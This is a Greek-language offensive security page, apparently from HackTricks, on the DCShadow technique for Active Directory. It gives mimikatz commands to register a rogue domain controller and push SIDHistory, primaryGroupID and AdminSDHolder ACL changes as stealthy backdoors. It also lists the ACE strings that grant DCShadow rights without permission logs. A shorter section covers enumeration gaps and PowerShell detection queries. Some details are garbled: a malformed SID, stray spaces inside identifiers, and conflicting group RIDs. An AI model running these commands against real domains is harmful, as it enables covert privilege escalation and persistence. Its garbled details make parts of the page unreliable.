# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Βασικές Πληροφορίες

Καταχωρεί έναν **new Domain Controller** στο AD και τον χρησιμοποιεί για να **push attributes** (SIDHistory, SPNs...) σε καθορισμένα αντικείμενα **χωρίς** να αφήνει κανένα **logs** σχετικά με τις **τροποποιήσεις**. Χρειάζεσαι **DA** προνόμια και πρέπει να βρίσκεσαι μέσα στο **root domain**.\
Σημειώστε ότι αν χρησιμοποιήσετε λανθασμένα δεδομένα, θα εμφανιστούν αρκετά άσχημα logs.

Για να εκτελέσετε την επίθεση χρειάζεστε 2 mimikatz instances. Το ένα θα ξεκινήσει τους RPC servers με SYSTEM privileges (πρέπει να δηλώσετε εδώ τις αλλαγές που θέλετε να εκτελέσετε), και το άλλο instance θα χρησιμοποιηθεί για να push τις τιμές:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Παρατηρήστε ότι **`elevate::token`** δεν θα λειτουργήσει σε συνεδρία `mimikatz1` καθώς αυτό ανέβασε τα προνόμια του thread, αλλά πρέπει να ανεβάσουμε τα **προνόμια της διεργασίας**.\
Μπορείτε επίσης να επιλέξετε ένα αντικείμενο "LDAP": `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Μπορείτε να εφαρμόσετε τις αλλαγές από έναν DA ή από έναν χρήστη με αυτά τα ελάχιστα δικαιώματα:

- Στο **domain object**:
- _DS-Install-Replica_ (Πρόσθεση/Αφαίρεση Replica στο Domain)
- _DS-Replication-Manage-Topology_ (Διαχείριση Topology Αναπαραγωγής)
- _DS-Replication-Synchronize_ (Συγχρονισμός Αναπαραγωγής)
- Το **Sites object** (και τα παιδιά του) στον **Configuration container**:
- _CreateChild and DeleteChild_
- Το αντικείμενο του **computer which is registered as a DC**:
- _WriteProperty_ (όχι Write)
- Το **target object**:
- _WriteProperty_ (όχι Write)

Μπορείτε να χρησιμοποιήσετε [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) για να δώσετε αυτά τα προνόμια σε έναν χρήστη χωρίς προνόμια (να σημειωθεί ότι αυτό θα αφήσει κάποια logs). Αυτό είναι πολύ πιο περιοριστικό από το να έχεις προνόμια DA.\
Για παράδειγμα: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Αυτό σημαίνει ότι το username _**student1**_ όταν έχει συνδεθεί στο μηχάνημα _**mcorp-student1**_ έχει DCShadow δικαιώματα πάνω στο αντικείμενο _**root1user**_.

## Χρήση DCShadow για δημιουργία backdoors
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Κατάχρηση κύριας ομάδας, κενά στην απαρίθμηση, και ανίχνευση

- `primaryGroupID` είναι ένα ξεχωριστό attribute από τη λίστα `member` της ομάδας. DCShadow/DSInternals μπορεί να το γράψει άμεσα (π.χ., set `primaryGroupID=512` για **Domain Admins**) χωρίς on-box LSASS enforcement, αλλά AD εξακολουθεί να **μετακινεί** τον χρήστη: η αλλαγή του PGID πάντα αφαιρεί την ιδιότητα μέλους από την προηγούμενη κύρια ομάδα (ίδια συμπεριφορά για οποιαδήποτε target group), οπότε δεν μπορείς να διατηρήσεις την παλιά membership της κύριας ομάδας.
- Τα default εργαλεία αποτρέπουν την αφαίρεση ενός χρήστη από την τρέχουσα κύρια ομάδα του (`ADUC`, `Remove-ADGroupMember`), οπότε η αλλαγή του PGID συνήθως απαιτεί απευθείας εγγραφές στον κατάλογο (DCShadow/`Set-ADDBPrimaryGroup`).
- Η αναφορά membership είναι ασυνεπής:
  - **Περιλαμβάνει** μέλη που προκύπτουν από την κύρια ομάδα: `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
  - **Παραλείπει** μέλη που προκύπτουν από την κύρια ομάδα: `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit inspecting `member`, `Get-ADUser <user> -Properties memberOf`.
- Οι αναδρομικοί έλεγχοι μπορεί να χάνουν μέλη κύριας ομάδας αν η **κύρια ομάδα είναι η ίδια εμφωλευμένη** (π.χ., το PGID του χρήστη δείχνει σε μια εμφωλευμένη ομάδα μέσα στους Domain Admins); `Get-ADGroupMember -Recursive` ή LDAP recursive filters δεν θα επιστρέψουν αυτόν τον χρήστη εκτός αν η αναδρομή επιλύει ρητά τις primary groups.
- Κόλπα με DACL: επιτιθέμενοι μπορούν να **deny ReadProperty** στο `primaryGroupID` του χρήστη (ή στο attribute `member` της ομάδας για ομάδες που δεν είναι AdminSDHolder), κρύβοντας την πραγματική membership από τις περισσότερες PowerShell ερωτήσεις; το `net group` θα εξακολουθήσει να επιλύει την membership. Οι ομάδες προστατευόμενες από AdminSDHolder θα επαναφέρουν τέτοιες αρνήσεις.

Παραδείγματα ανίχνευσης/παρακολούθησης:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
Επαληθεύστε τις προνομιούχες ομάδες συγκρίνοντας την έξοδο του `Get-ADGroupMember` με το `Get-ADGroup -Properties member` ή το ADSI Edit για να εντοπίσετε ασυμφωνίες που προκαλούνται από το `primaryGroupID` ή κρυφά attributes.

## Shadowception - Give DCShadow permissions using DCShadow (no modified permissions logs)

Πρέπει να προσθέσουμε τις ακόλουθες ACEs με το SID του χρήστη μας στο τέλος:

- Στο αντικείμενο domain:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- Στο αντικείμενο υπολογιστή του επιτιθέμενου: `(A;;WP;;;UserSID)`
- Στο αντικείμενο χρήστη-στόχου: `(A;;WP;;;UserSID)`
- Στο αντικείμενο Sites στον Configuration container: `(A;CI;CCDC;;;UserSID)`

Για να πάρετε την τρέχουσα ACE ενός αντικειμένου: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Σημειώστε ότι σε αυτή την περίπτωση χρειάζεται να κάνετε **πολλές αλλαγές,** όχι μόνο μία. Έτσι, στην **mimikatz1 session** (RPC server) χρησιμοποιήστε την παράμετρο **`/stack` με κάθε αλλαγή** που θέλετε να κάνετε. Με αυτόν τον τρόπο, θα χρειαστεί να κάνετε **`/push`** μόνο μία φορά για να εκτελέσετε όλες τις κολλημένες αλλαγές στον rogue server.

[**More information about DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

## Αναφορές

- [TrustedSec - Adventures in Primary Group Behavior, Reporting, and Exploitation](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [DCShadow write-up in ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
